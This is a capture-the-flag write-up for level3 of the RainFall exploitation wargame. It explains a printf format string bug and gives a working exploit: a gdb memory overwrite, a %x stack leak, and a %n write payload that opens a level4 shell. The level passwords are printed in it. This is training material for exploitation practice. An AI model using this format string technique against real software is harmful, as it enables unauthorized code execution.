Format String Vulnerability: 
Using printf(buffer) directly means a user can inject format specifiers (%x, %s, etc.).

Potential Exploit Path: If attacker controls buffer and global at 0x804988c, it may allow arbitrary code execution via the system() call.

level3@RainFall:~$ gdb ./level3 
(gdb) b v
Breakpoint 1 at 0x80484ad
(gdb) r
Starting program: /home/user/level3/level3 
Breakpoint 1, 0x080484ad in v ()
(gdb) set *(int*)0x804988c = 0x40
(gdb) continue
Continuing.
lo
lo
Wait what?!
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

Then it calls printf() directly with the user input as the format string — this introduces a format string vulnerability.

another way :
We leak the stack using "%x" to find where our input lands on the stack, so that we can insert an address like 0x804988c into our input, and printf will read that address as a pointer to write to via %n

python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"'
output:
aaaa 200 b7fd1ac0 b7ff37d0 61616161 ...

You see 61616161 (which is 'aaaa'), that tells you where in the stack your input lands. If 'aaaa' shows up at the 4th %x, then your input is the 4th argument on the stack.

address of m : 4 bytes
pad of arbitrary data : 60 bytes

level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
^C
level3@RainFall:~$ su level4
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
level4@RainFall:~$